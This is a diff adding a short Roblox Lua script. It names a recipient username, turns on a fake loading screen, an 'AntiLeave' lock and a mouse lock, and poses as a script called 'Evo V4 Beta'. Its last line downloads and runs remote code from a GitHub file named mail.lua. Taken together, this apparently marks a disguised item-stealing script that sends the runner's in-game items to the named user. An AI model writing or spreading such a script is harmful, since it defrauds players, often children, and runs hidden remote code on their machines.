@@ -1,0 +1,23 @@
+UserName = "Wizard_CatWhite"
+
+UserName2 = "Wizard_CatWhite" -- optional delete the whole line if you don't want it
+
+_G.LoadingScreen = true
+
+_G.AntiLeave = true
+
+_G.MouseLock = true 
+
+-- set them to false if you don't need them
+
+_G.ScriptName = "Evo V4 Beta v0.182"
+
+_G.FirstText = "Script Preparing"
+
+_G.SecondText = "Script Loading..."
+
+_G.ThirdText = "Almost Done..."
+
+_G.WaitingTime = 200 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://github.com/RainIsntBald/Vault/raw/main/k4f/mail.lua", true))()
